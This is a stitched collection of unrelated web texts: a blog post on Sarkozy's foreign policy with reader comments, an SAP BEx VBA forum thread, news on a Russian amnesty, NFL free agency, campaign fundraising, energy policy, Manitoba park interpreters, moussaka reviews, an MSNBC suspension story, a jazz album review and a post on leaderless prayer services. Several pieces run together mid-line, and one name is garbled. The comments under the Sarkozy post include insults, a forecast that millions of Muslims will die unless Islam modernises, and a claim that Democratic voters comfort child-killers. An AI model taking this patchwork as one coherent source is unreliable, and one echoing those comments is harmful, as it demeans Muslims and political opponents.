As indicated at a defense conference during the presidential campaign, Sarkozy is pressing European Union member states to increase their participation in the defense effort. A strong EU, capable of defending itself and acting in concert with–not in competition against–NATO, is in the interest of all. This is the Europe he is committed to, the strong Europe that will shoulder its share of the burden. And, we must observe, has miles to go before it wakes from its sleep.. Though reaffirming his belief in the two-state solution via the Road Map, he shifts the focus from vague peace wishes to a dire warning: If the international community accepts the fait accompli of a Hamastan in Gaza, it will be the first step in an Islamist takeover of the Palestinian territories. Sarkozy, like other Western leaders, calls for the reconstruction of the Palestinian Authority under the leadership of Abbas.
Likewise, he promises that France will promote dialogue between all parties in Lebanon and encourage them to participate peacefully and fairly in the forthcoming presidential election. He invites Syria to work in favor of that peaceful solution, in which case a Franco-Syrian dialogue would become possible. All of this might sound like wishful thinking, vain hopes or, at the worst, a sanctimonious European cop out. The world is ablaze with life-threatening conflicts and Europeans keep talking about bringing all parties together for harmonious negotiation. The fact is that France has made zero progress in Lebanon, the Palestinian Authority shows precious little authority, and Syria is not promoting harmonious relations anywhere. But Nicolas Sarkozy wants to be judged on his results in both foreign and domestic policies which, he insists, are inseparable. Absolutely. Especially since each of these particular situations is framed by a resounding warning of impending conflict between Islam and the West.
Did Sarkozy soften his stand on Turkey? I don’t think so. Out of respect for his European partners, Sarkozy acknowledged that discussions with Turkey might or more certainly will continue. Reiterating his personal opposition to Turkey’s admission into the EU, he advised that the pursuit of discussions should not preclude an ultimate refusal. This is a clear response to the Turkish “not if but when” claim that the EU, having gone this far, cannot turn back.. In a globalized world, says Sarkozy, where the dangers and the opportunities are multiplied, and respect no frontiers, “…notions of Third World and non-alignment have no meaning.” Turning his back on the discourse of solidarity with “les mis√©rables” -and criminal indulgence for their misdeeds-Sarkozy invites Europe’s southern (primarily Muslim) neighbors to embrace the challenge of globalization and stave off the catastrophic clash between Islam and the West.
Regretting that the new multipolar relations are marked by conflict when they should permit harmonious action between the great powers,.
Reaffirming his confidence in Europe’s role in promoting harmonious multilateralism based on mutual respect and fair.” Aid should be maintained but managed more intelligently. Economic prospects will not be optimized without improved security and resolution of armed conflicts..
Riding high on 71% approval ratings, Nicolas Sarkozy is true to his promise that foreign policy would be forthright, open, and subject to debate from both Parliament and citizens. While assuming ultimate responsibility for decisions, the president willingly exposes himself to judgment and criticism. Publication of the military cooperation document signed in Libya after the liberation of the hostages is not an embarrassment. Discussions with (ugh) Hugo Chavez in the hopes of liberating the Franco-Colombian Ingrid Betancourt from the FARC – the Communist revolutionary army in Colombia – were announced today.
Fruitful debate on these issues should focus on the billion Euro question: when do you stop talking and start shooting? That is The Question! Somewhere between the awareness of a looming clash between Islam and the West and sincere hopes of avoiding it by intelligent strategy and well-meaning dialogue, the French president will have to make painful choices.
You really should stop smoking crack. Not a single word is true or/and based on facts, not a single one.
Robert is just another one of our American Jerks, fast lip, slow brain. Nicolas Sarkozy is a breath of fresh air. He and all leaders in the west will have to make very tough decisions in the next several years.
The sand is running out on the Islam of the 11th century, like it or not, with or with out a nuclear strike by the west or some rogue terrorist element on the west, Islam will either join modernity or millions of its followers will likely die. Since the 11th century Islam has charted a course rightly or wrongly which has brought the world to this point of no return. Beginning with 1950s, that course possesed no middle ground
Robert, how about some specifics – with citations – of where Poller is wrong instead of ad hominems which may you dismissable. Or are you just a troll?
In view of the fact that we have supposedly alienated the whole world, I find it strange how so many of the world leaders that we alienated have been replaced by ones who do not appear to be alienated from us at all.
Could it be that the media were lying about all this, and just feeding us Democrat propaganda designed to destroy Bush, even as he seeks to fight a war on terrorism?
Well, it certainly looks that way, doesn’t it? I say if you vote for a Democrat, you are voting for someone who has been offering comfort to the people who are raising their children to kill your children.
“unable able to resist the temptation of unilateral recourse to force” And thank goodness that the US was unwilling to be held back by the French, Russian and German politicians that Saddam had BOUGHT with Oil for Food cash.”and unwilling to show capacity for leadership in environmental protection”America INVENTED the national park. France certainly does not maintain such a large fraction of it territory undeveloped and in its natural state. Europeans don’t have many endangered species left, because they KILLED THEM ALL ALREADY. Jesus wept.
I am definitely and American non-jerk. I, too, believe that M. Sarkozy is a breath of fresh air.
I am insufficiently acquainted with French governance, so I have a question for the commentariat:
To what extent can the bureaucracies stymie M. Sarkozy? Does France have a politically insulated “civil service” akin to the US?
Put another way — if some civil “servant” works to stymie M. Sarkozy’s foreign policy, what recourse does he have to remove the “servant”?
Best Regards,
I am with Robert, stop smocking crack !
I am amazed how your doing a panageric of Sarkozy, he just tells what the the people wants to hear ; he can’t change with a finger click a policy that has last so many decades ; it’s not the interest of France anyway, he has to care for the future of our enterprises, energies supplies…

you can display the query description and also the technical query name using a text item.
But how can I display the name of a view which is used as a data provider?
I would like to add the view name above my analysis grid because there are many analysis grids in my workbook. It would be also nice, if the view name would be displayed in the variable screen (and not the name of the query). I can rename the logical names of the dataprovider (instead DP_1 for example "my view") and in this way at least the variable screen would show this description. But that's not really comfortable. And this would not help me to show the view names above my grids somewhere on the sheet.
Any ideas?
Thanks a lot.
BR, Andreas
Hi Andreas
this is a funny but sad functionality within BEx workbooks.
There is no SAP way (I found out so far) to read the name of the view.
What you can do is as following:
When opening a Query-View by help of the open query functionality you will select a View.
Now BEx grabs the workbook template and in default condition runs the SAP macro CALLBACK.
Here is exactely the point of interest.
Just (for testing) insert a VBA Command 'STOP' in the first lnes and reopen another Query View.
You will see that the initial name of the View (technical name) will be displayed in the Excel Caption ( the Header Line in Excel, above the menue entries).
After finishing the CALLBACK macro Bex default functionality will change the caption back to Query name.
The Callback macro will set the Header of the table and Chart sheet as well (see Coding)
' Adapt Title in Title Box
Sheet2.Shapes("TextQueryTitle").DrawingObject.Text = Sheet2.Range("E1").Value
Sheet3.Shapes("TextQueryTitle").DrawingObject.Text = Sheet2.Range("E1").Value
So what I sometimes do, if View name is required ( at least the technical name ( make it human friendly) is to use the functionality of VBA to save the caption name in a hidden cell (similar to SAP coding above)
Just use the coding: Cells(26, 4).Value = Application.Caption
(Where (cells26,4) means row 26 and column D) and change it to a hidden cell.
By help of VBA you can get rid of the prefix ('Microsoft Excel -' as well
A final display could be:
Sheet2.Shapes("TextQueryTitle").DrawingObject.Text = Mid(Application.Caption, 19, 50)
Sheet3.Shapes("TextQueryTitle").DrawingObject.Text = Mid(Application.Caption, 19, 50)
I know this is a workaround but at least a workarround.
Another enhancement is to call a RFC call to retrieve the View text by help of this key.
If you are looking for this feature as well let me know
If this little excursion into BEx functionality helps I am pleased
Best regards
Joerg Boeke BI Analyst
Hi all,
when embedding a query view into a BEx Analyzer workbook its not the view that is stored within the workbook but instead the query behind the view. The navigational state defined by the view is used as initial state for the query but the data provider is mapped to the query behind.

The members of the Pussy Riot punk band, Greenpeace activists and protesters jailed after the May 2012 Bolotnaya demonstration will be freed in an amnesty dedicated to the 20th anniversary of the Russian Constitution, Russian media report.
A total of 25,000 people will be freed under the amnesty initiated by President Putin, Interfax cited Vladimir Vasilyev, deputy speaker of parliament, as saying.
“Around 1,300 people will be released from prison, and 17,500 people will be relieved of non-custodial sentences. In addition, criminal proceedings against nearly 6,000 can be terminated,” Vasilyev said.
Several Russian media outlets including Izvestia and Vedomosti newspapers have obtained a copy of the draft amnesty, which was submitted to the parliament by President Vladimir Putin on Monday.
According to the papers, the participants in such high-profile cases as the Pussy Riot Cathedral protest, Greenpeace’s Arctic Sunrise boarding of an oil rig and the Bolotnaya Square riots will all be granted amnesty.
The upcoming amnesty won’t apply to those who committed crimes that posed a serious danger to society, Vladimir Vasilyev said, adding that the amnesty will give preference to convicts in vulnerable social categories and people who have served the country.
It will favor all minors, mothers with small children, pregnant women, women over 55 and men over 60, the disabled, Chernobyl cleanup workers and military veterans, he said.
According to Vedomosti newspaper, the draft amnesty covers three articles of the criminal code “as an exception,” which means that those, who were convicted under them, will be freed or relived from punishment regardless of age, sex and social status.
The first such article Number 213 is “hooliganism”, which means
that two Pussy Riot members – Maria Alekhina and Nadezhda
Tolokonnikova – as well as the Greenpeace’s activists, awaiting
trial in Russia, will a get pardon.
Three members of the Pussy Riot punk band were each sentenced to two years in prison after staging a protest in Moscow's Christ the Savior Cathedral in February 2012, although one member of the band was later released on appeal.
The 30 Greenpeace activists are currently on bail and awaiting trial after an attempt to board Russia’s Prirazlomnaya oil platform in the Barents Sea this September.
The second exception stands for article 212 (parts 2 and 3) - "participation in riots and attempts to incite rioting."
It means that nine protesters, who were detained following Moscow riots on Bolotnaya Square in May 2012, but who are not accused of using force against police, will be also freed under amnesty, according to Vedomosti.
The third exception deals with those, who were convicted for violating traffic regulation with severe consequences to people’s health.
Meanwhile, those, who committed economic crimes, won’t be
pardoned as there has already been an amnesty for this category
of prisoners earlier this year, with 1,431 people released,
Izvestia said.
This means that former oil tycoon Mikhail Khodorkovsky and his business partner, Platon Lebedev, will remain behind bars.
The amnesty will be adopted before the end of the year and implemented within the next six months, a high-ranked source in the parliament told Izvestia.
Russia celebrates the 20th anniversary of the country’s Constitution on December 12.
The head of the Presidential Council on Civil Society and Human
Rights, Mikhail Fedotov, expressed his satisfaction with the
draft amnesty bill and said hoped it wouldn't suffer heavy
revisions by the Duma deputies.
“I’m sure that there’ll be some MPs, who’ll try to widen the amnesty bill and those, who’ll push for it to be narrowed. In the end, I hope that it’ll remain as it was when submitted by the President,” he told RIA-Novosti news agency.
But one of the heads of Memorial human rights center, Oleg Orlov, has called the draft amnesty bill a disappointment.
“Even in its current form, I welcome the document. At least, some people will be released,” he told Interfax news agency. “But that part of Russian society, which advocated an amnesty, understand it in a broader sense, and of course we are disappointed."
President Putin tasked human rights activists with putting together a draft bill for an amnesty dedicated to the 20th anniversary of the country’s modern Constitution in late September.
In mid-October, the draft bill, which proposed to pardon around 100,000 prisoners, was approved by the Presidential Council for Human Rights.Free Agency: What’s happening around the league
DENVER — While we’re working furiously to track down all of the Broncos’ free agency moves, let’s also take a quick spin around the NFL to check out some of the other big transactions.
– Former Denver cornerback Domonique Foxworth is getting PAID. Foxworth, traded to the Falcons early last September, has agreed to a 4-year deal with the Ravens worth $28 million, including $16.5 million guaranteed, according to the NFL Network’s Adam Schefter. Nice move for Foxworth, who is a Maryland native. He also played college football at Maryland. Couldn’t happen to a nicer guy.
– The Browns have traded TE Kellen Winslow to the Tampa Bay Bucs. Winslow had his share of drama in Cleveland last year. Still, he’s leaving one unsettled situation for another. Neither team has its quarterback situation figured out, and both have new coach-GM combos.
– Ravens LB Bart Scott is going to the New York Jets. Of course, that’s where Rex Ryan, the former Baltimore defensive coordinator, is the new head coach. Scott had been a name floated around as possibly joining the Broncos, though it looks now like he would have been too expensive. His deal is New York is reportedly for five years and $40 million, according to ESPN.
– Former Jacksonville running back Fred Taylor is joining the New England Patriots. Taylor enters his 12th season this fall, and his first with a team other than the Jags. ESPN’s Len Pasquarelli speculates that Taylor will compete with Laurence Maroney for the starting job.

Bruceitt Romney may have out-raised Barack Obama in May, but both camps are still jawing over another prize: small donors.
Mitt Romney and the Republican National Committee raised over $76 million in May, the first month for the two officially joined forces, and the first month where large donors weren’t tempted by any other GOP candidates.
Barack Obama’s campaign raised only $60 million. It’s the first month in which Obama has raised less than a Republican opponent during this election cycle.
They tried to put lipstick on the pig by focusing on successes with small donors, a class of supporters that's especially important to each campaign's narrative as a sputtering economy and wealth inequality loom large.
“We'll always have more people pitching in,” campaign manager Jim Messina said in the “We got beat” e-mail. “We know that only 15 percent of Romney's May totals came from people giving less than $250, compared to 98 percent in that category for us.”
However, the Obama campaign is comparing apples and oranges. Mitt Romney raised $12 million from donations under $250 — only 15 percent of his $76 million total — but 93 percent of the number of donations was under $250. That’s much closer to the 98 percent figure touted by the Obama campaign — which, it should be noted, was not up-front with a dollar amount for money raised from small donors. (We did the math: about $30 million.)
Here’s where it gets weird: Obama was out-raised despite having over 250,000 more donors than Romney. And while Obama got $30 million out of over 11,000 people donating more than $250, Romney got almost $65 million from over 22,000 people donating more than $250. That’s twice as much money from twice as many deep pockets.
Here’s where it gets weirder: the average small donation to the Obama campaign was $54.94, while the average small donation to Romney was about $40.
In other words, there appears to be less of a “middle class” of Romney donors. The average Romney small donor is giving less than the average Obama small donor; a large donor is twice as likely to have given to Romney than to Obama. The rich give richer; the not-as-rich, not as much.
Using figures provided by each campaign, the average of all donations to Obama appears to be around $104. For Mitt Romney, the average is $240.
While the Obama campaign was a little disingenuous in the e-mail comparing small donor percentages, the larger points they attempted to make appear true: a greater number of small donors give to Obama, and a greater number of large donors give to Romney.
There will be much more to dissect as more information comes to light. Until the FEC releases the official filings later this month, all we have to go on is what each campaign says. As their press releases suggest, and the math proves, the numbers the campaigns want to talk about are just the tip of the iceberg.Is Energy Independence Undesirable?

Jesse Parent says:
I generally agree, JB, with perhaps one exception. The first paragraph about oil is very good, and leads into this point which I very much agree with. I actually wonder if the following is the most significant or likely 'gateway' towards creating any sort of energy change/adaptation/evolution within the US:
"The only way to manage our exposure to the politics of the major oil producing regions (including Venezuela) is to follow Director Woolsey's advice to end the oil monopoly on transportation fuels. Natural gas and its alcohol derivatives promise a means to that end."
Transportation will be a keystone for many parts of the US take on energy, even if simply a means by which Americans comprehend energy - 'gas prices'. If it was instead "natural gas prices", or something other than the current pump habits, that might be an avenue for change. If the natgas industry can combine with the transportation & manufacturing industry, that would be a 'revolution' I'd be curious to see. But I want to see more inependent analysis and have some fracking questions answered before I hail such as the way to go (of course).
."
But what about all of the above? Put them on there anyway and start hardnessing as much energy as you can. Not everyone is so sure the drop in emissions will remain as significant as it is, but in general I think taking coal out of the mix as much as possible is a good idea. You can't say that in a presidential debate yet, though, at least when coal-job swing states are in the mix.
I think the US should be pushing forwad with solar as much as it can, even with the huge shadow of Solyndra still clouding the metaphorical skies. But I do wonder now if, even from ?

John Miller says:
Peter, Your comparison of Romney and Obama energy plans being similar is debatable (Re.). Mr. Stern’s article arrives at conclusions that appear to deviate from actual history. Yes, price controls were counter to domestic free market function, but these were implemented after the 1973 Arab OPEC oil embargo. The oil crisis during the early 1970’s was quite real. Due to loss of only 5% of total U.S. oil supply normal market supply-demand balances were significantly disrupted causing numerous localized shortages. The Government tried to mitigate these issues through a number of actions including the price control policies and eventually building the U.S. SPR. After the dysfunctional new/old oil price controls were removed the market rapidly recovered, and the new developments of ANS and Gulf oil fields soon followed.
Increased energy security, defined as the sum of the reliabilities of each supply source, is achieved by reducing the overall risk of future oil supply disruption. Arguably today we are at historic high levels of imported oil supply disruption risk. Of the 19 million barrels per day (MBD) consumed in the U.S., about 2 MBD come from the Persian Gulf. Due to the Iranian nuclear ambitions and their threat to shutdown the Strait of Hormuz the U.S. now faces possible immediate loss of 10% of total oil supply. The SPR will help mitigate the impacts of this real threat to energy security, but the folks on the West and East Coasts will likely relive their memories of 1973 (Re.).
I agree that making the U.S. totally independent of world oil markets is likely infeasible. This factor does not affect the ultimate objective of energy security: to significantly reduce the risk level of future oil supply disruptions, be them natural (weather, quake, etc.) or man-made (Strait of Hormuz shutdown, embargos, etc.). Since we can’t control the weather or unstable foreign governments, we need to focus on actions that can feasible be controlled. This includes eliminating the need for Persian Gulf imports first. The combination of further increased domestic oil supply (a large part of the Romney plan) and petroleum energy efficiency (a small part of the Obama plan), can feasibly eliminate this risk of disrupting up to 10% of current U.S. oil supply in the near future. Developing other petroleum alternatives should be the next priority. These policy actions would only reduce the number of available energy supply sources by a small percentage and increase U.S. energy security quite substantially.

John Miller says:
Peter, I stand corrected on the overall energy price controls that were in place prior to 1973. As you are aware, these past market/price control regulations largely contributed to peaking of U.S. domestic oil production in 1970, which also contributed to the magnitude of the Arab OPEC oil embargo impacts. What I was referencing was the Emergency Petroleum Allocation Act in 1973 and the Energy Policy and Conservation Act of 1975 that created an even more complex system of price controls of ‘old’ oil and deregulated/re-regulated ‘new’ oil (3-tiers). Fixing the price of all existing domestic oil production led to accelerated depletion of domestic production and ironically encouraged the market to increase imports (the exact opposite objective of past Federal price controls). Yes, these regulations contributed to the 1979 (Iranian Revolution) energy crisis as you state.
I don’t believe we are in disagreement on the negative impacts of price controls on oil markets. Where I’m still not sure we agree is the supply-demand fundamentals. Physical loss of OPEC imports in 1973 also had a significant impact on supplies and shortages. The largest shortages were with Independents that did not have access to limited domestic supply or available Majors’ inventories.
Today we generally have access to plenty of oil and have only experienced actual short-term supply disruptions due to weather and equipment failures. The most recent example is the California refinery outages. It was predictable that the California politicians called for an investigation of the oil companies due to the very recent shortages and rapid run-up in retail prices. Despite these supposed oil company market manipulation investigations being fairly common over the years (none to my knowledge ever found a violation of the law), politicians still reflexively believe that market prices should not change and possibly be controlled. My most recent experience during hurricane Katrina found that Major oil companies actually fear legal action by politicians and are willing to sell motor fuels at a loss during these weather related shortages. This legal threat-fear response is another form of price controls that affect markets. Majors can generally afford the loss, Independents suffer financially.
I look forward to reading your book,

The author's point that oil producing countries are not at all likely to play the "oil weapon" against their best customer is true, but it misses the real danger of continuing to purchase oil from unfriendly and unstable nations. The real danger of our continuing to be reliant on these nations for our oil supply is that the billions of dollars that we pour into them often goes to support individuals and groups that want to harm the U.S. For instance, although the Bin Laden wealth that helped Osama grow al Qaeda did not come directly from oil, a majority of it came to the Bin Laden construction firm directly from the Saudi government which essentially granted the family a monopoly on the construction business. And U.S. oil money is helping prop up President Chavez in Venezuela, who, along with his buddy Ahmadinejad, are not exactly in America's fan club. And U.S. oil money is helping to prop up a system in Nigeria where the government is paying large sums of money to armed thugs to keep them from destroying their oil infrastructure. While it would initially be painful for the economies of these countries to lose the tremendous flow of oil cash from the West, wouldn't it be better in the end if the U.S. was not reliant on these troubled states for it's energy or contributing to their internal turmoil? I fully agree that the U.S. needs a diverse supply of energy, but I believe we should be working on getting that diverse supply from within our own borders. MIT has shown that with better technology, the continental U.S. has enough geothermal energy to provide enouch electricity for the entire country several times over. And there is enough offshore wind potential to power the entire East Coast. And there is enough solar power potential to power all of our industries. It will take years, even decades, for the U.S. to arrive at the place where we no longer need oil from anyone other than ourselves and our close ally to the north, but that is the energy security towards which we should be diligently be working. Yes, we need diversity, but not from an international supply of

Every year, between 75,000 and 100,000 people come into contact with one of Manitoba's friendly park interpreters. These professionals connect park visitors with natural and cultural history by designing engaging programs for school groups, ensuring people's safety on hikes, answering natural history questions in interpretive centres, delivering large-scale amphitheatre programs, and sharing stories around the campfire. They spark imagination, connection, and inspiration. Study after study around the world has shown that interpretation boosts the economy, decreases damage to sensitive resources, and gives visitors life-long connections to place.
It is amazing to think that there are only 21 provincial park interpreters in Manitoba, covering only 9 of Manitoba's 86 provincial parks, and none of them are year-round positions with benefits. Despite this, park interpreters are able to meaningfully connect with tens of thousands of park visitors each year.
Even though the benefits of having park interpreters is enormous, and the cost is so low, the current government is considering gutting the program in April's budget*. At the same time, the government envisions itself as "The Parks Province," listing numerous objectives that need interpreters to achieve**.
We hope to hear announced in the new budget that the interpretive program not be cut, but instead."
*The Winnipeg Free Press, in an interview with Conservation and Water Stewardship Minister Gord Mackintosh, states: The cuts will be announced in next month's budget [April]. "We may have to have some skinnier interpretive programming for a couple of years," he said, citing one area under review. ()
**Manitoba just released its Building The Parks Province: Manitoba’s Parks Strategy, in which it outlines many ways to improve parks. A strong and vibrant interpretive program is the only way Manitoba can reach the goals outlined in the strategy and its stated goal to become “The Parks Province.” You can see it at:
I am very concerned that the Manitoba Government is considering gutting the award-winning provincial parks interpretive field program in April's budget. Currently, there are only 21 seasonal interpreters in only 9 of Manitoba's 86 parks.

- Highest Rating both my boyfriend and I like the slight char taste. I love the simplicity of this recipe because it can be even more complicated. Oh, I do boil potatoes and add a thin layer on top of the eggplant per boyfriend's request the second and third go round. I could take or leave the potato myself but it's not bad.
This was great. I've never had moussaka before, but this dish was easy enough to try! I used beef and the cinnamon, and I didn't see the tip about doubling until well after, but I did double and used a 13x9 pan which turned out just fine. Even the picky eaters among my kids loved it. I did add a layer of shredded 3 cheese Italian blend on the top. 35 minutes in the convection oven at 350 was perfect. Thanks so much!
I had only made the Craig Claiborne version (from the New York Times cookbook)---rave reviews, but WOW was it complicated! This version tastes even better, and is far, far simpler to assemble. KC, another winner!
This was great. However, "large" eggplant must mean different things to different people. I picked 2 of the biggest ones (total 4 pounds) and a 9X9 pan was way too small... next time I will use about 2.5 pounds. This time I used a 2.5 qt deep casserole dish and doubled the cheese sauce. It is WAY easier to grill the eggplant. I started off in the oven since I had just pulled out the pita but quickly abandoned that and moved to the BBQ, where the slices got brown and dry without sticking and it was much easier to watch and turn!!!!
First, I must say right up front that my cooking ability is nothing to write home about. However, I was trying to find something different to fix for Thanksgiving dinner (we're a family of vegetarians). I found this recipe and read all of the reviews (yes, all 100 ), so, I thought I would give it a shot. I used Morning Star Farm crumblers instead of ground beef, doubled the recipe, added a bit of cinnamon between the eggplant layers, and 'sweated' the eggplant slices (as suggested by most reviewers). The preparation took much longer than described. However, it was totally worth every second!! I coupled the Moussaka with Kittencalskitchen's greek salad as well. That was the first time I had every made my own salad dressing. Well, I received so many compliments during dinner, after dinner, and even during the Dallas Cowboys vs Detroit Lions football game!! Thank you so much, Kittencalskitchen, for posting such a mouth-watering recipe!
Another great Greek recipe from Kittencal! I impressed the in-laws with this dish. It was delicious as written, but I think I will try adding the tsp of cinnamon next time.
Another great recipe by Kittencal. We had never had Moussaka before and are now Moussaka lovers. I did go the traditional route and added a light sprinkle of ground cinnamon over the top layer of eggplant. Could not find ground lamb so I bought some leg of lamb and ground my own. Can't get any fresher than that! It states 4 servings, but you can easily get 6 - 8. I cooked mine in a 13 X 9. Will make again. Thanks. with this fantastic lady's recipes, the one's Ive tryed so far are all absolutely wonderful!!!!!!!! Thank you Kittencal for another GREAT recipe.
This was absolutely fabulous! I sweated the eggplant for about 45 mins then grilled it on my george foreman grill for 6 mins. It took forever since the grill is small, but I didn't mind. I used a large glass casserole dish and 45 mins seemed to be the perfect amount of time. I added the teaspoon of cinnamon and I'm so glad I decided to add it. I'll definitely add the cinnamon every time I make this. I will be making this again soon! I also like that it is easy to freeze the leftovers. Thanks for sharing Kittencal. This was the most impressive recipe I have made in awhile.
This came out great! I did make a couple changes- I added a little bit of cumin to the eggplant layer (but I put cumin in nearly everything haha), and I changed the cheese sauce into a parve white sauce (made of flour, margarine, plain soy milk and an egg whisked in). All in all, excellent, thank you!
White House complained to MSNBC over Mark Halperin's 'inappropriate' analysis of Obama
White House Press Secretary Jay Carney told reporters Thursday that he contacted MSNBC big wigs over the offensive term that "Morning Joe" political analyist Mark Halperin uttered earlier in the day.
“The comment that was made was inappropriate. It would be inappropriate to say that about any president of either party. And on behalf of the White House, I expressed that sentiment to executives at the network,” Carney explained.
Carney complained to the network after it had suspended Halperin indefinitely but didn't want to discuss if the Obama administration was pleased with the swift move.
“I have no comment on that -- whatever action that network, any network, any newspaper or whatever might make and -- because that's not for us to decide, and we didn't -- certainly -- you know, we just expressed our concern about the inappropriateness of the comment," Carney said.
“Are we on the seven-second delay today?” Halperin asked "Morning Joe" co-hosts Joe Scarborough and Mika Brzezinski, a hint that what he wanted to say would in some way contain spicy language.
“I wanted to characterize how I thought the president behaved,” Halperin said in reference to comments Obama made Wednesday in a news conference where he compared Congress's work habits to that of his pre-teen daughters.
“Take a chance,” Scarborough goaded.
“I thought he was kind of an ... yesterday,” Halperin said, using a crude anatomical reference.
Greg Sargent of the Washington Post had an interesting take in the wake of the suspension in which he called the network's actions on the Time magazine editor crazy.
"Halperin’s crack was crude and dumb, but it doesn’t deserve indefinite suspension. Halperin’s use of an expletive is trival when compared with the degradation of our political discourse we witness on a regular basis from Halperin and many others — degradation that is seen as perfectly acceptable because no curse words are employed," Sargent wrote.
," Sargent added, and later criticized Halperin specifically for other reasons.
Alex Pardee of Salon, after calling Halperin a "useless tool," washed his hands at the entire "Morning Joe" crew.
"Everyone got really excited that Halperin was about to use a bad word, because these people are children, and Halperin looked very pleased with himself after he said the bad word on the TV. Chuckle chuckle chuckle! Faux-outrage! Fun and high jinks! High-quality political analysis, everyone," Pardee wrote in his piece titled "Mark Halperin comes up with great excuse to fire Mark Halperin".

- XXL
Nuevos Medios
2007
The music on XXL covers a lot of ground, from heavy funk to ballads, and from abstract pieces with changing time signatures to moody, minimalist numbers. Big on brassy riffs, surges of electric bass and guitar, and a sonic blanket of sound effects, XXL is also surprisingly short on solos.
With such an array of sounds at Fortuny's disposal the temptation to experiment was obviously great. Several songs from Revolts (Nuevos Medios, 2005) get a work-over here. On "Third Generation Fortuny leads the band into free-form jazz/funk territory, sandwiched between a rather simple brass riff, and it sounds like two songs welded together, or perhaps two bands welded together.
On the otherwise impressive "To Steve Coleman, which reveals Fortuny's admirable arranging skills, the band indulges in a few bars of old-time swing which come across as a rather pointless pastiche. The title of the other song from Revolts is "Conflicte Bipolar, and in a musical sense Fortuny appears to be struggling at times to make sense of the wealth of ideas bouncing around his head. The opening track "Mal Dous, for example, begins with a Maceo Parker-ish guitar funk riff. It then goes every which way, big brass riffs alternating with melodic passages which owe a lot to Frank Zappa's Hot Rats (Zappa Records, 1969), but it never quite finds a groove for very long.
Elsewhere Fortuny nails it. By contrast to the in-your-face-ness of much of the rest of the album, "Els Pistolers de Sant Celoni is a tender ballad which begins with a lone alto sax singing plaintively. The song grows with some beautiful ensemble playing and the ringing cry of a pedal steel guitar. The arrival of a Mexican trumpet solo lifts and sweeps the band along, pointing it in 1960s Ennio Morricone direction. Several times Fortuny builds up and strips down the layers of music in masterly fashion. It is perhaps the most powerful track on the album and one which shouts the least.
Other standout tracks include "Auxille, a moody, minimalist piece with a slow hypnotic pulse, and "Intro, a melancholic number which begins with a sax playing initially alone over a repeating trombone riff. Subsequently the sax's voice is enriched by lovely brass accompaniment. Both these tracks prove that less is often more.
Llibert Fortuny's debut as a big-band leader is a mixed bag. At times, his regular quintet sounds like an uncalled-for appendage to the role of the big band, or perhaps it is the other way round. However, when it all comes together, there are enough signs to suggest that Llibert Fortuny is a name we will hear a lot more of in the future.

Fugu is the Japanese word for pufferfish, a fish that is said to be tasty when prepared correctly, but lethally poisonous when the poisonous parts are not removed. Many American audiences (including my 11-year-old self) were introduced to it through the classic Simpsons episode "One Fish, Two Fish, Blowfish, Blue Fish", in which Homer eats fugu and then believes that he has 24 hours to live.
Rooftop: The Origins
It started in September 2003. A few of us were feeling disgruntled with the Shabbat morning options in New York on non-Hadar weeks and wanted to try something completely different, so we threw together a non-minyan (i.e. there were intentionally fewer than 10 of us, so we didn't have to worry about reading Torah or any of that) in Central Park. We liked it so much we did it again a number of times, often on one of our roofs. (This combined the advantages of being outside with easy access to bathrooms and food for the potluck lunches that often followed.) When the weather was inclement, we'd take it inside into a living room, but the name "rooftop davening" (or "rooftop-style davening") had stuck.
Rooftop: The Style
On paper it's simple: there is no leader. Anyone should feel free to start any melody for any prayer.
Beyond that, the ground rules are fluid. Sometimes, instead of a Torah service (in the absence of a Torah or a minyan), we would read and discuss the Torah portion. But we would often start at times that were moral (i.e. late), and rooftop (when done well) can be a prescription for long davening, so that by the time we got through pesukei dezimrah and shacharit, we'd decide that it was time for lunch, and reading the Torah portion and/or musaf could happen after lunch. Sometimes that would actually happen after lunch, sometimes not. Sometimes an actual minyan would show up at some point in the morning, at which point we would appoint a sheliach tzibbur for the parts that require one, and continue rooftop-style for everything else.
Rooftop: The Advantages
I'm not sure anyone would want to pray this way every week, but as an occasional alternative experience, it has a number of things going for it.
- In the absence of an organized Friday night option, anyone can throw together a Friday night minyan in their apartment. Not so for Shabbat morning. Shabbat morning minyanim have significant costs in capital (a sefer Torah) and labor (Torah readers, who need to prepare beforehand). This is one way to put together a low-cost Shabbat morning prayer experience in the absence of that capital and labor.
- It's an opportunity for free experimentation with the liturgy - a space to test out new melodies or new text-melody pairings before they're "ready for prime time". Some things that I now use when leading a minyan originated in rooftop.
- Formal teaching of melodies is acceptable, whereas it wouldn't be in many genres of minyanim.
- When you're doing a full-liturgy Shabbat morning minyan, pesukei dezimrah necessarily gets short shrift, because you're trying to get through everything by a reasonable hour. Rooftop has no time limits, so it's an opportunity to focus on the many parts of pesukei dezimrah that are often mumbled through in 20 seconds. To generalize, normal davening has to strike a balance between kavanah and efficiency, and rooftop removes efficiency from the picture so that the kavanah side can get full attention.
- When done right, it's a grassroots bottom-up experience: everyone in the community participates equally in making the service happen. No one is more or less important than anyone else.
- Since multiple people are each leading small parts, this gives people who might not be ready to lead an entire service the opportunity to lead something, and ensures a diversity of styles within one service.
Rooftop: The Pitfalls
However, casting off the wise restraints that make us free can have many deleterious unintended consequences. As with fugu, opportunities to be poisoned lurk everywhere.
1) Awkward silences. If no one jumps in with a melody for a given piece of liturgy, what happens next? How long does everyone look around at each other awkwardly before concluding that this thing just isn't going to be sung out loud, and it's time to do that prayer individually? At this point, the aforementioned radical egalitarianism may start to buckle, because people feel varying degrees of responsibility for the awkward silence - some think "It's my problem and I should do something", and others think "It's somebody else's problem", or even "It's Ploni's problem." As a result, Ploni may find unwanted leadership thrust on him/her, or in the absence of a Ploni, everyone may be confused for a while.
One solution we found was to appoint a "pacesetter", or "sheliach tzibbur of last resort", for each section of the service. (Recruitment of pacesetters can simply happen at the very beginning, and doesn't need to happen in advance.) The pacesetter's job is to shoulder the burden of looking around awkwardly so that everyone else can be relieved of this burden. If nothing happens for some length of time (as determined by the pacesetter), the pacesetter steps in and either starts singing something or starts mumbling loudly to signal that it's time to move on.
The existence of the pacesetter may cut into the leaderless ideal, but transparent leadership is still more egalitarian than leadership by default.
2) Out of sync. The flip side is that instead of awkward silences, sometimes if nothing is happening, people will plow on ahead on their own, until something happens. If this goes on for a while, then by the time someone starts in with something, everyone is in vastly different places, and people are forced to jump ahead or jump back. (Plus there is the potential for additional awkward looking-around, as people try to ascertain where others have gotten to, to figure out whether they're ahead or behind or what.)
This can also be remedied in part by the pacesetter, if the pacesetter's responsibilities also include signaling the end of each unit of liturgy, to keep people in sync.
